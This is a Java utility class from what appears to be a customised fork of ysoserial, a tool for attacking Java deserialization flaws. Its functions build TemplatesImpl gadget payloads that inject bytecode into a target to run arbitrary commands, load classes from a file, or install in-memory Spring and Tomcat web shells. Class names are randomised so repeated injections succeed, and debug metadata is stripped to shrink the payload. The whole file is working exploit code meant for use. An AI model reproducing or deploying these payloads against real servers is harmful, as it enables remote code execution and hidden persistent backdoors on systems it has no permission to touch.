package ysoserial.payloads.util;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.*;
import org.objectweb.asm.*;
import javassist.bytecode.*;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.lang.RandomStringUtils;
import org.apache.wicket.util.file.Files;
import ysoserial.payloads.templates.SpringInterceptorMemShell;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPOutputStream;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;


/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings({"restriction", "rawtypes", "unchecked"})
@Slf4j
public class Gadgets {

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }

    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }

    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }

    public static Map<String, Object> createMap(final String key, final Object val) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }

    public static Object createTemplatesImpl(String command) throws Exception {
        command = command.trim();
        Class tplClass;
        Class abstTranslet;
        Class transFactory;

        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            tplClass = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
            abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        } else {
            tplClass = TemplatesImpl.class;
            abstTranslet = AbstractTranslet.class;
            transFactory = TransformerFactoryImpl.class;
        }

        if (command.startsWith("CLASS:")) {
            // 这里不能让它初始化，不然从线程中获取WebappClassLoaderBase时会强制类型转换异常。
            Class<?> clazz = Class.forName("ysoserial.payloads.templates." + command.substring(6), false, Thread.currentThread().getContextClassLoader());
            return createTemplatesImpl(clazz, null, null, tplClass, abstTranslet, transFactory);
        } else if (command.startsWith("FILE:")) {
            byte[] bs = Files.readBytes(new File(command.substring(5)));
            return createTemplatesImpl(null, null, bs, tplClass, abstTranslet, transFactory);
        } else {
            return createTemplatesImpl(null, command, null, tplClass, abstTranslet, transFactory);
        }
    }


    public static <T> T createTemplatesImpl(Class myClass, final String command, byte[] bytes, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
        final T templates = tplClass.newInstance();
        byte[] classBytes = new byte[0];
        ClassPool pool = ClassPool.getDefault();
//        pool.insertClassPath(new ClassClassPath(abstTranslet));
//        pool.insertClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
        CtClass superC = pool.get(abstTranslet.getName());
        CtClass ctClass;

        if (command != null) {
            ctClass = pool.get("ysoserial.payloads.templates.CommandTemplate");
            ctClass.setName(ClassNameUtil.getRandomInjectorClassName());
            String cmd = "cmd = \"" + command + "\";";
            ctClass.makeClassInitializer().insertBefore(cmd);
            ctClass.getClassFile().setMajorVersion(50);
            shrinkBytes(ctClass);
//            ctClass.setSuperclass(superC);
            classBytes = ctClass.toBytecode();
            classBytes = compressBytecode(classBytes);
        }
        if (myClass != null) {
            // CLASS:
            ctClass = pool.get(myClass.getName());
//            ctClass.setSuperclass(superC);
            // SpringInterceptorMemShell单独对待
            if (myClass.getName().contains("SpringInterceptorMemShell")) {
                // 修改b64字节码
                CtClass springTemplateClass = pool.get("ysoserial.payloads.templates.SpringInterceptorTemplate");
                String clazzName = ClassNameUtil.getRandomInjectorClassName();
                springTemplateClass.setName(clazzName);
                String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
                String b64content = "b64=\"" + encode + "\";";
                ctClass.makeClassInitializer().insertBefore(b64content);
                // 修改SpringInterceptorMemShell随机命名 防止二次打不进去
                String clazzNameContent = "clazzName=\"" + clazzName + "\";";
                ctClass.makeClassInitializer().insertBefore(clazzNameContent);
                ctClass.setName("SpringInterceptorMemShell" + System.nanoTime());
                shrinkBytes(ctClass);
                classBytes = ctClass.toBytecode();
            } else {
                // 其他的TomcatFilterMemShellFromThread这种可以直接加载 需要随机命名类名
                ctClass.setName(ClassNameUtil.getRandomInjectorClassName());
                ctClass.getClassFile().setMajorVersion(50);
                classBytes = ctClass.toBytecode();
                classBytes = compressBytecode(classBytes);
            }
        }
        if (bytes != null) {
            // FILE:
            ctClass = pool.get("ysoserial.payloads.templates.ClassLoaderTemplate");
            String name = ClassNameUtil.getRandomInjectorClassName();
            ctClass.setName(name);
            ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
            GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf);
            gzipOutputStream.write(bytes);
            gzipOutputStream.close();
            String content = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
            // System.out.println(content);
            ctClass.makeClassInitializer().insertBefore(content);
            ctClass.makeClassInitializer().insertBefore("ByPassJavaModul("+name+".class);");
            shrinkBytes(ctClass);
            ctClass.getClassFile().setMajorVersion(50);
//            ctClass.setSuperclass(superC);
            classBytes = ctClass.toBytecode();
            classBytes = compressBytecode(classBytes);
        }

        CtClass cc = pool.makeClass("Foo");
        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, cc.toBytecode() });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", RandomStringUtils.randomAlphabetic(8).toUpperCase());
        Reflections.setFieldValue(templates, "_transletIndex", 0);
//        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    public static HashMap makeMap(Object v1, Object v2) throws Exception {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }


        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }



    public static void shrinkBytes(CtClass ctClass) {
        try {
            ClassFile classFile = ctClass.getClassFile2();
            classFile.removeAttribute(SourceFileAttribute.tag);
            classFile.removeAttribute(LineNumberAttribute.tag);
            classFile.removeAttribute(LocalVariableAttribute.tag);
            classFile.removeAttribute(LocalVariableAttribute.typeTag);
            classFile.removeAttribute(DeprecatedAttribute.tag);
            classFile.removeAttribute(AnnotationDefaultAttribute.tag);
            classFile.removeAttribute(InnerClassesAttribute.tag);
            classFile.removeAttribute(EnclosingMethodAttribute.tag);
//            classFile.removeAttribute(SignatureAttribute.tag);
            // classFile.removeAttribute(StackMapTable.tag);
            List<MethodInfo> list = classFile.getMethods();
            for (MethodInfo info : list) {
                info.removeAttribute("RuntimeVisibleAnnotations");
                info.removeAttribute("RuntimeInvisibleAnnotations");
                info.removeAttribute("RuntimeVisibleParameterAnnotations");
                info.removeAttribute("RuntimeInvisibleParameterAnnotations");
                info.removeAttribute("AnnotationDefault");
            }
        } catch (Throwable e) {
            log.error(e.getMessage());
        }
    }

    public static  byte[] compressBytecode(byte[] bytes) {
        // Logger.normal("Origin bytecode length: " + bytes.length);
        ClassReader cr = new ClassReader(bytes);
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        int api = Opcodes.ASM9;
        ClassVisitor cv = new ShortClassVisitor(api, cw);
        int parsingOptions = ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES;
        cr.accept(cv, parsingOptions);
        byte[] out = cw.toByteArray();
        // log.info("Compress bytecode length: " + out.length);
        // log.info(String.format("The compression ratio is %.2f%%", (float) (bytes.length - out.length) / bytes.length));
        return out;
    }

    static class ShortClassVisitor extends ClassVisitor {
        private final int api;

        public ShortClassVisitor(int api, ClassVisitor classVisitor) {
            super(api, classVisitor);
            this.api = api;
        }

        @Override
        public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
            MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
            return new ShortMethodAdapter(this.api, mv);
        }
    }
    static class ShortMethodAdapter extends MethodVisitor implements Opcodes {
        public ShortMethodAdapter(int api, MethodVisitor methodVisitor) {
            super(api, methodVisitor);
        }

        @Override
        public void visitLineNumber(int line, Label start) {
            // delete line number
        }
    }
}
